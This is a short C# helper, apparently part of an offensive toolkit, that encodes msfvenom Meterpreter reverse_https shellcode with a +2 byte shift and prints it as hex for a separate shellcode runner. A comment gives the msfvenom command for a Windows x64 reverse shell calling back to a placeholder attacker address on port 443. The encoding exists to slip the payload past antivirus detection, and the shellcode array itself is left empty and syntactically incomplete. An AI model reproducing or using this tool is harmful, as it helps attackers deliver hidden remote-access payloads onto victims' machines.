using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Helper
{
	class Program
    {
	static void Main(string[] args)
    	{
    	//msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.XX.XX LPORT=443 -f csharp

	byte[] buf = new byte[597]

	byte[] encoded = new byte[buf.Length];
	for (int i = 0; i < buf.Length; i++)
    
    	{
    	encoded[i] = (byte)(((uint)buf[i] + 2) & 0xff);
    	}

    	StringBuilder hex = new StringBuilder(encoded.Length * 2);
    	foreach (byte b in encoded)

    	{
    	hex.AppendFormat("0x{0:x2}, ", b);
    	}

	string hexString = hex.ToString();
	hexString = hexString.Replace(" ","");
	Console.WriteLine("[@@@] copy the below shellcode to place into ".ToUpper()+"runner.cs"+"\n[***] Run the following command: ./xorCS.py -r <runner file> -s "+buf.Length.ToString()+" -Sc \"new shellcode\"\n"+"[+++] Buffer Size: "+buf.Length.ToString()+"\n\n"+hexString.TrimEnd(','));
    	}
    }
}
